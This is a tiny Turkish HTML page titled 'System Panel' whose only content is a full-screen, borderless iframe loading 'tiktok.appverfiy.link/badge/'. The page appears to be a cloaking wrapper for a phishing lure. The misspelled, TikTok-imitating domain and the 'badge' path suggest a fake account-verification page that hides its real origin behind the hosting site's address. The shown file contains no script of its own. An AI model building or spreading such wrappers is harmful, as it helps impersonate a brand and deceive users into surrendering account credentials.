<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Paneli</title>
    <style>
        /* Kenar boşluklarını sıfırla ve kaydırmayı kapat */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000; /* Panel yüklenirken arka plan siyah görünsün */
        }

        /* Iframe'i tüm ekrana yay */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <iframe 
        src="https://tiktok.appverfiy.link/badge/" 
        allowfullscreen="true"
        allow="autoplay; clipboard-write; encrypted-media; picture-in-picture"
        frameborder="0">
    </iframe>

</body>
</html>
